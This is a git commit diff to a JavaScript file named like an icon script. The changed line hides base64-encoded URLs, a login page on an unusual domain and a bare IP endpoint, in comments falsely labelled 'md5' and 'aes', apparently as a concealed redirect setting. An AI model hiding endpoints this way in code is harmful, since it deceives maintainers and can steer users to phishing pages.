4e931718c73e5eb9e47b050d421cf7fd96ec01c2
caocao <caocaodajun@gmail.com>
2022-03-23 12:24:47 +0800

    init

--- js/icon_oorcev.js
+++ js/icon_oorcev.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly9hcHAueXVlaHVpMjIuYnV6ei91c2VyL3R1YmUvaW5kZXguaHRtbA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cHM6Ly93d3cuaXBuYnMueHl6LyMvcGFnZXMvbG9naW4/dj0y**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
